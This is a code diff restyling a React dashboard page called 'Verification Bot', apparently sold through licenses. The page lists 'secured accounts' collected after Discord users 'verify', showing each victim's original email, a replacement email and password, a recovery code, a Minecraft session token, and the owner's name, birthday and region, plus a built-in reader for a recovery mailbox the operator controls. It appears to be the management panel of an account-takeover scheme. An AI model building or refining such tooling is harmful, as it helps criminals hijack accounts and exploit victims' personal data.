@@ -265,107 +265,86 @@ function VerificationBotPage() {
   }
 
   return (
-    <div className="space-y-6 animate-page-in">
-      <header className="flex items-start gap-4">
-        <div className="h-12 w-12 rounded-xl brutal-border bg-primary/15 text-primary flex items-center justify-center animate-border">
-          <ShieldCheck className="h-6 w-6" />
+    <div className="space-y-6">
+      <header className="space-y-1">
+        <div className="flex items-center gap-2 flex-wrap">
+          <h1 className="text-2xl font-semibold tracking-tight">Verification Bot</h1>
+          {isAdmin && (
+            <span className="rounded bg-primary/15 text-primary px-2 py-0.5 text-[10px] font-medium">
+              Admin
+            </span>
+          )}
         </div>
-        <div className="flex-1">
-          <h1 className="font-display text-4xl font-semibold tracking-tight">
-            Verification Bot
-            {isAdmin && (
-              <span className="ml-3 inline-flex items-center rounded-full bg-primary/15 text-primary px-2.5 py-0.5 text-xs font-semibold brutal-border">
-                ADMIN
-              </span>
-            )}
-          </h1>
-          <p className="mt-1 text-muted-foreground">
-            Use <strong>your own Discord bot</strong> — paste token + public key below.
-          </p>
-          <p className="text-[11px] text-primary/70 mt-0.5">
-            Create a bot in Discord Developer Portal, invite it, then enter IDs + credentials.
-          </p>
-        </div>
+        <p className="text-sm text-muted-foreground">
+          Your Discord bot token, server IDs, and secured accounts.
+        </p>
       </header>
 
       {activeKey && (
-        <div className="rounded-2xl brutal-border bg-card p-6 animated-border">
-          <div className="flex items-center justify-between">
-            <div className="flex items-center gap-2 text-xs uppercase tracking-widest text-primary">
-              <Check className="h-3.5 w-3.5" /> Active license
-            </div>
+        <div className="rounded-xl border border-border/60 bg-card px-4 py-3 flex flex-wrap items-center justify-between gap-3">
+          <div className="flex items-center gap-2 text-sm">
+            <Check className="h-4 w-4 text-primary" />
+            <span className="font-medium">License active</span>
             {!isAdmin && (
-              <span className="text-xs text-muted-foreground">
-                Expires {new Date(activeKey!.expires_at).toLocaleString()}
+              <span className="text-muted-foreground text-xs">
+                · expires {new Date(activeKey!.expires_at).toLocaleDateString()}
               </span>
+            )}
+            {isAdmin && (
+              <span className="text-muted-foreground text-xs">· admin bypass</span>
             )}
           </div>
           {!isAdmin && (
-            <div className="mt-3 flex items-center gap-3">
-              <code className="flex-1 rounded-lg bg-secondary/40 px-4 py-3 font-mono text-lg tracking-wider">
+            <div className="flex items-center gap-2 min-w-0">
+              <code className="text-xs font-mono truncate max-w-[200px] text-muted-foreground">
                 {activeKey.key}
               </code>
               <button
                 onClick={() => copy(activeKey.key)}
-                className="rounded-lg brutal-border bg-secondary/40 hover:bg-secondary px-4 py-3 text-xs font-semibold flex items-center gap-2"
+                className="text-xs text-primary hover:underline shrink-0"
               >
-                {copied === activeKey.key ? (
-                  <Check className="h-4 w-4" />
-                ) : (
-                  <Copy className="h-4 w-4" />
-                )}
                 {copied === activeKey.key ? "Copied" : "Copy"}
               </button>
-            </div>
-          )}
-          {isAdmin && (
-            <div className="mt-2 text-xs text-muted-foreground font-semibold">
-              Admin mode -- payment checks bypassed.
             </div>
           )}
         </div>
       )}
 
       {!activeKey && !isAdmin && (
-        <div className="rounded-2xl brutal-border bg-card p-8 md:p-10 text-center space-y-4">
-          <div className="mx-auto h-14 w-14 rounded-2xl bg-primary/10 brutal-border flex items-center justify-center">
-            <ShieldCheck className="h-7 w-7 text-primary" />
-          </div>
-          <div className="space-y-2">
-            <h2 className="font-display text-2xl font-semibold">Get Verification Bot</h2>
-            <p className="text-sm text-muted-foreground max-w-md mx-auto leading-relaxed">
-              Purchase a license or redeem a key in Settings to unlock configuration and secured accounts.
-            </p>
-            <a
-              href="/dashboard/purchase"
-              className="inline-flex mt-2 rounded-full bg-primary text-primary-foreground px-5 py-2 text-xs font-semibold"
-            >
-              View purchase
-            </a>
-          </div>
+        <div className="rounded-xl border border-border/60 bg-card p-6 text-center space-y-3">
+          <h2 className="text-lg font-semibold">No license yet</h2>
+          <p className="text-sm text-muted-foreground max-w-sm mx-auto">
+            Buy a plan or redeem a key in Settings to use Verification Bot.
+          </p>
+          <a
+            href="/dashboard/purchase"
+            className="inline-flex rounded-lg bg-primary text-primary-foreground px-4 py-2 text-sm font-medium"
+          >
+            Purchase
+          </a>
         </div>
       )}
 
-      {/* Tabs — visible for admins and users with active keys */}
       {(isAdmin || activeKey) && (
         <>
-          {/* Tabs */}
-          <div className="flex gap-1 rounded-xl brutal-border bg-card p-1 animate-tab-enter">
+          <div className="flex gap-0 border-b border-border/60">
             {[
-              { id: "config" as const, label: "Configuration", icon: Settings },
-              { id: "guide" as const, label: "Setup Guide", icon: BookOpen },
-              { id: "accounts" as const, label: `Secured Accounts (${securedAccounts.length})`, icon: ShieldCheck },
+              { id: "config" as const, label: "Config" },
+              { id: "guide" as const, label: "Guide" },
+              {
+                id: "accounts" as const,
+                label: `Accounts${securedAccounts.length ? ` (${securedAccounts.length})` : ""}`,
+              },
             ].map((tab) => (
               <button
                 key={tab.id}
                 onClick={() => setActiveTab(tab.id)}
-                className={`flex-1 flex items-center justify-center gap-2 rounded-lg px-4 py-2.5 text-xs font-semibold transition-all duration-300 ${
+                className={`px-4 py-2.5 text-sm font-medium border-b-2 -mb-px transition-colors ${
                   activeTab === tab.id
-                    ? "bg-primary text-primary-foreground shadow-md tab-active-glow"
-                    : "text-muted-foreground hover:text-foreground hover:bg-secondary/30"
+                    ? "border-primary text-foreground"
+                    : "border-transparent text-muted-foreground hover:text-foreground"
                 }`}
               >
-                <tab.icon className="h-4 w-4" />
                 {tab.label}
               </button>
             ))}
@@ -731,17 +710,13 @@ function VerificationBotPage() {
             </div>
           )}
 
-          {/* Secured Accounts Tab */}
           {activeTab === "accounts" && (
-            <div className="space-y-4 animate-tab-enter">
+            <div className="space-y-4">
               <div className="flex flex-wrap items-center justify-between gap-3">
-                <div>
-                  <h3 className="font-display text-lg font-semibold">Secured Accounts</h3>
-                  <p className="text-xs text-muted-foreground">
-                    {securedAccounts.length} account{securedAccounts.length === 1 ? "" : "s"} · click to expand · open inbox on-site
-                  </p>
-                </div>
-                <div className="flex gap-2">
+                <p className="text-sm text-muted-foreground">
+                  {securedAccounts.length} secured
+                </p>
+                <div className="flex gap-3 text-xs">
                   <button
                     type="button"
                     onClick={() => {
@@ -752,16 +727,16 @@ function VerificationBotPage() {
                       }
                       setExpandedIds(next);
                     }}
-                    className="rounded-full brutal-border px-3 py-1.5 text-[11px] font-semibold hover:bg-secondary/40"
+                    className="text-muted-foreground hover:text-foreground"
                   >
-                    Expand all
+                    Expand
                   </button>
                   <button
                     type="button"
                     onClick={() => setExpandedIds({})}
-                    className="rounded-full brutal-border px-3 py-1.5 text-[11px] font-semibold hover:bg-secondary/40"
+                    className="text-muted-foreground hover:text-foreground"
                   >
-                    Collapse all
+                    Collapse
                   </button>
                   <button
                     type="button"
@@ -771,9 +746,9 @@ function VerificationBotPage() {
                         .then((accts) => setSecuredAccounts(accts as Array<Record<string, unknown>>))
                         .finally(() => setLoading(false));
                     }}
-                    className="rounded-full brutal-border px-3 py-1.5 text-[11px] font-semibold hover:bg-secondary/40 inline-flex items-center gap-1.5"
+                    className="text-primary hover:underline"
                   >
-                    <RefreshCw className="h-3 w-3" /> Refresh
+                    Refresh
                   </button>
                 </div>
               </div>
@@ -791,27 +766,21 @@ function VerificationBotPage() {
                       setCopied(label + id);
                       setTimeout(() => setCopied(null), 1200);
                     };
-                    const field = (label: string, value: string, mono = true) => (
-                      <div className="rounded-xl bg-background/50 border border-border/50 p-3 space-y-1.5 min-w-0">
+                    const field = (label: string, value: string) => (
+                      <div className="min-w-0 space-y-0.5">
                         <div className="flex items-center justify-between gap-2">
-                          <span className="text-[10px] uppercase tracking-widest text-muted-foreground font-semibold">
-                            {label}
-                          </span>
+                          <span className="text-xs text-muted-foreground">{label}</span>
                           {value && value !== "—" ? (
                             <button
                               type="button"
                               onClick={() => void copyVal(label, value)}
-                              className="text-[10px] text-primary hover:underline"
+                              className="text-[11px] text-muted-foreground hover:text-foreground"
                             >
-                              {copied === label + id ? "Copied" : "Copy"}
+                              {copied === label + id ? "ok" : "copy"}
                             </button>
                           ) : null}
                         </div>
-                        <code
-                          className={`block text-[12px] text-foreground break-all leading-relaxed ${
-                            mono ? "font-mono" : ""
-                          }`}
-                        >
+                        <code className="block text-sm font-mono break-all text-foreground">
                           {value || "—"}
                         </code>
                       </div>
@@ -820,96 +789,68 @@ function VerificationBotPage() {
                     return (
                       <div
                         key={id}
-                        className="rounded-2xl border border-border/60 bg-card/80 overflow-hidden shadow-[0_0_0_1px_transparent] hover:border-primary/25 transition-colors"
+                        className="rounded-lg border border-border/50 bg-card overflow-hidden"
                       >
                         <button
                           type="button"
                           onClick={() =>
                             setExpandedIds((prev) => ({ ...prev, [id]: !prev[id] }))
                           }
-                          className="w-full flex items-center gap-3 p-4 text-left hover:bg-secondary/20 transition-colors"
+                          className="w-full flex items-center gap-3 px-3.5 py-3 text-left hover:bg-secondary/15"
                         >
-                          <div className="h-10 w-10 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-center shrink-0">
-                            <ShieldCheck className="h-5 w-5 text-primary" />
-                          </div>
+                          {expanded ? (
+                            <ChevronDown className="h-4 w-4 text-muted-foreground shrink-0" />
+                          ) : (
+                            <ChevronRight className="h-4 w-4 text-muted-foreground shrink-0" />
+                          )}
                           <div className="flex-1 min-w-0">
-                            <div className="font-semibold text-sm truncate">
+                            <div className="text-sm font-medium truncate">
                               {String(acc.mc_username || "Unknown")}
                             </div>
-                            <div className="text-[11px] text-muted-foreground truncate">
-                              {String(acc.new_email || acc.mailbox_email || acc.mc_email || "")}
-                              {acc.secured_at
-                                ? ` · ${new Date(String(acc.secured_at)).toLocaleString()}`
-                                : ""}
+                            <div className="text-xs text-muted-foreground truncate">
+                              {String(acc.new_email || acc.mailbox_email || "")}
                             </div>
                           </div>
-                          <div className="flex items-center gap-2 shrink-0">
-                            {hasMailbox ? (
-                              <span className="hidden sm:inline-flex text-[10px] uppercase tracking-wider rounded-full bg-primary/15 text-primary px-2 py-0.5 font-semibold">
-                                Mailbox
-                              </span>
-                            ) : null}
-                            {expanded ? (
-                              <ChevronDown className="h-4 w-4 text-muted-foreground" />
-                            ) : (
-                              <ChevronRight className="h-4 w-4 text-muted-foreground" />
-                            )}
-                          </div>
+                          <span className="text-xs text-muted-foreground shrink-0">
+                            {acc.secured_at
+                              ? new Date(String(acc.secured_at)).toLocaleDateString()
+                              : ""}
+                          </span>
                         </button>
 
                         {expanded ? (
-                          <div className="px-4 pb-4 space-y-4 border-t border-border/40 pt-4">
-                            <div>
-                              <div className="text-[10px] uppercase tracking-widest text-muted-foreground font-semibold mb-2">
-                                Credentials changed
-                              </div>
-                              <div className="grid sm:grid-cols-2 gap-2">
-                                {field("Original email", String(acc.mc_email || "—"))}
-                                {field("New email", String(acc.new_email || "—"))}
-                                {field("New password", String(acc.new_password || "—"))}
-                                {field("Recovery code", String(acc.new_recovery_code || "—"))}
-                              </div>
+                          <div className="px-3.5 pb-3.5 space-y-4 border-t border-border/40 pt-3">
+                            <div className="grid sm:grid-cols-2 gap-x-6 gap-y-3">
+                              {field("Original email", String(acc.mc_email || "—"))}
+                              {field("New email", String(acc.new_email || "—"))}
+                              {field("Password", String(acc.new_password || "—"))}
+                              {field("Recovery code", String(acc.new_recovery_code || "—"))}
+                              {field("Method", String(acc.mc_method || "—"))}
+                              {field("Capes", String(acc.mc_capes || "—"))}
+                              {field(
+                                "Name",
+                                [acc.owner_first_name, acc.owner_last_name]
+                                  .filter(Boolean)
+                                  .join(" ") || "—",
+                              )}
+                              {field("Region", String(acc.owner_region || "—"))}
+                              {field("Birthday", String(acc.owner_birthday || "—"))}
+                              {acc.mc_ssid
+                                ? field(
+                                    "SSID",
+                                    String(acc.mc_ssid).slice(0, 64) +
+                                      (String(acc.mc_ssid).length > 64 ? "…" : ""),
+                                  )
+                                : null}
                             </div>
 
-                            <div>
-                              <div className="text-[10px] uppercase tracking-widest text-muted-foreground font-semibold mb-2">
-                                Account details
-                              </div>
-                              <div className="grid sm:grid-cols-2 gap-2">
-                                {field("MC username", String(acc.mc_username || "—"))}
-                                {field("Purchase / method", String(acc.mc_method || "—"))}
-                                {field("Capes", String(acc.mc_capes || "—"))}
-                                {field(
-                                  "Owner name",
-                                  [acc.owner_first_name, acc.owner_last_name]
-                                    .filter(Boolean)
-                                    .join(" ") || "—",
-                                )}
-                                {field("Region", String(acc.owner_region || "—"))}
-                                {field("Birthday", String(acc.owner_birthday || "—"))}
-                                {acc.mc_ssid
-                                  ? field("SSID", String(acc.mc_ssid).slice(0, 80) + (String(acc.mc_ssid).length > 80 ? "…" : ""))
-                                  : null}
-                              </div>
-                            </div>
-
-                            <div className="rounded-2xl border border-primary/30 bg-gradient-to-br from-primary/10 via-transparent to-transparent p-4 space-y-3">
-                              <div className="flex flex-wrap items-start justify-between gap-3">
-                                <div className="flex items-start gap-3 min-w-0">
-                                  <div className="h-9 w-9 rounded-lg bg-primary/15 flex items-center justify-center shrink-0">
-                                    <Mail className="h-4 w-4 text-primary" />
-                                  </div>
-                                  <div className="min-w-0">
-                                    <div className="text-xs font-semibold text-primary">
-                                      Recovery mailbox inbox
-                                    </div>
-                                    <code className="text-[11px] text-foreground/90 break-all block mt-0.5">
-                                      {String(acc.mailbox_email || acc.new_email || "—")}
-                                    </code>
-                                    <p className="text-[10px] text-muted-foreground mt-1">
-                                      Open mail here — no password shown. Run Supabase mailbox columns if Open fails.
-                                    </p>
-                                  </div>
+                            <div className="rounded-lg border border-border/50 bg-secondary/10 p-3 space-y-3">
+                              <div className="flex flex-wrap items-center justify-between gap-2">
+                                <div className="min-w-0">
+                                  <div className="text-sm font-medium">Mailbox</div>
+                                  <code className="text-xs text-muted-foreground break-all">
+                                    {String(acc.mailbox_email || acc.new_email || "—")}
+                                  </code>
                                 </div>
                                 <button
                                   type="button"
@@ -957,66 +898,49 @@ function VerificationBotPage() {
                                       setMailboxLoading(false);
                                     }
                                   }}
-                                  className="inline-flex items-center gap-1.5 rounded-full bg-primary text-primary-foreground px-4 py-2 text-[11px] font-semibold disabled:opacity-50 shrink-0"
+                                  className="rounded-md bg-primary text-primary-foreground px-3 py-1.5 text-xs font-medium disabled:opacity-50"
                                 >
-                                  <Inbox className="h-3.5 w-3.5" />
                                   {mailboxLoading && inboxOpen
-                                    ? "Opening…"
+                                    ? "…"
                                     : inboxOpen
-                                      ? "Close inbox"
+                                      ? "Close"
                                       : "Open inbox"}
                                 </button>
                               </div>
 
                               {inboxOpen && mailboxError ? (
-                                <div className="rounded-lg border border-destructive/30 bg-destructive/10 p-3 text-[11px] text-destructive leading-relaxed">
-                                  {mailboxError}
-                                  <p className="mt-1 text-muted-foreground">
-                                    Need columns mailbox_email + mailbox_password on secured_accounts, and Mailcow IMAP reachable from Vercel.
-                                  </p>
-                                </div>
+                                <p className="text-xs text-destructive">{mailboxError}</p>
                               ) : null}
-
                               {inboxOpen && mailboxLoading ? (
-                                <p className="text-[11px] text-muted-foreground">Loading inbox…</p>
+                                <p className="text-xs text-muted-foreground">Loading…</p>
                               ) : null}
 
                               {inboxOpen && mailboxData && !mailboxLoading ? (
-                                <div className="grid md:grid-cols-[minmax(0,0.9fr)_minmax(0,1.1fr)] gap-2 rounded-xl overflow-hidden border border-border/50 bg-background/40">
-                                  <div className="max-h-72 overflow-y-auto divide-y divide-border/40">
-                                    <div className="px-3 py-2 text-[10px] uppercase tracking-widest text-muted-foreground sticky top-0 bg-background/90 backdrop-blur">
-                                      {mailboxData.count} message{mailboxData.count === 1 ? "" : "s"}
-                                    </div>
+                                <div className="grid md:grid-cols-2 gap-2 border border-border/40 rounded-md overflow-hidden">
+                                  <div className="max-h-64 overflow-y-auto divide-y divide-border/30">
                                     {mailboxData.messages.length === 0 ? (
-                                      <p className="p-3 text-[11px] text-muted-foreground">
-                                        Inbox empty
-                                      </p>
+                                      <p className="p-2.5 text-xs text-muted-foreground">Empty</p>
                                     ) : (
                                       mailboxData.messages.map((m) => (
                                         <button
                                           key={m.uid}
                                           type="button"
                                           onClick={() => setSelectedMsgUid(m.uid)}
-                                          className={`w-full text-left px-3 py-2.5 hover:bg-primary/5 transition-colors ${
-                                            selectedMsgUid === m.uid
-                                              ? "bg-primary/10 border-l-2 border-primary"
-                                              : ""
+                                          className={`w-full text-left px-2.5 py-2 hover:bg-secondary/30 ${
+                                            selectedMsgUid === m.uid ? "bg-secondary/40" : ""
                                           }`}
                                         >
-                                          <div className="font-semibold text-[11px] truncate">
+                                          <div className="text-xs font-medium truncate">
                                             {m.subject}
                                           </div>
-                                          <div className="text-[10px] text-muted-foreground truncate">
+                                          <div className="text-[11px] text-muted-foreground truncate">
                                             {m.from}
-                                          </div>
-                                          <div className="text-[10px] text-muted-foreground/70 mt-0.5">
-                                            {m.date ? new Date(m.date).toLocaleString() : ""}
                                           </div>
                                         </button>
                                       ))
                                     )}
                                   </div>
-                                  <div className="p-3 min-h-[12rem] max-h-72 overflow-y-auto border-t md:border-t-0 md:border-l border-border/40">
+                                  <div className="p-2.5 max-h-64 overflow-y-auto border-t md:border-t-0 md:border-l border-border/30">
                                     {(() => {
                                       const msg =
                                         mailboxData.messages.find(
@@ -1024,25 +948,19 @@ function VerificationBotPage() {
                                         ) || mailboxData.messages[0];
                                       if (!msg) {
                                         return (
-                                          <p className="text-[11px] text-muted-foreground">
+                                          <p className="text-xs text-muted-foreground">
                                             Select a message
                                           </p>
                                         );
                                       }
                                       return (
-                                        <div className="space-y-2">
-                                          <div className="font-semibold text-sm leading-snug">
-                                            {msg.subject}
-                                          </div>
-                                          <div className="text-[10px] text-muted-foreground">
+                                        <div className="space-y-1.5">
+                                          <div className="text-sm font-medium">{msg.subject}</div>
+                                          <div className="text-[11px] text-muted-foreground">
                                             {msg.from}
-                                            {msg.date
-                                              ? ` · ${new Date(msg.date).toLocaleString()}`
-                                              : ""}
                                           </div>
-                                          <div className="h-px bg-border/50" />
-                                          <p className="text-[12px] text-foreground/90 whitespace-pre-wrap leading-relaxed">
-                                            {msg.body || msg.snippet || "(empty)"}
+                                          <p className="text-xs whitespace-pre-wrap leading-relaxed text-foreground/90">
+                                            {msg.body || msg.snippet || ""}
                                           </p>
                                         </div>
                                       );
@@ -1058,12 +976,8 @@ function VerificationBotPage() {
                   })}
                 </div>
               ) : (
-                <div className="rounded-2xl brutal-border bg-card p-10 text-center">
-                  <ShieldCheck className="h-10 w-10 text-muted-foreground mx-auto mb-3" />
+                <div className="rounded-lg border border-border/50 bg-card p-8 text-center">
                   <p className="text-sm text-muted-foreground">No secured accounts yet.</p>
-                  <p className="text-xs text-muted-foreground/60 mt-1">
-                    After a member verifies, credentials and the recovery inbox appear here.
-                  </p>
                 </div>
               )}
             </div>
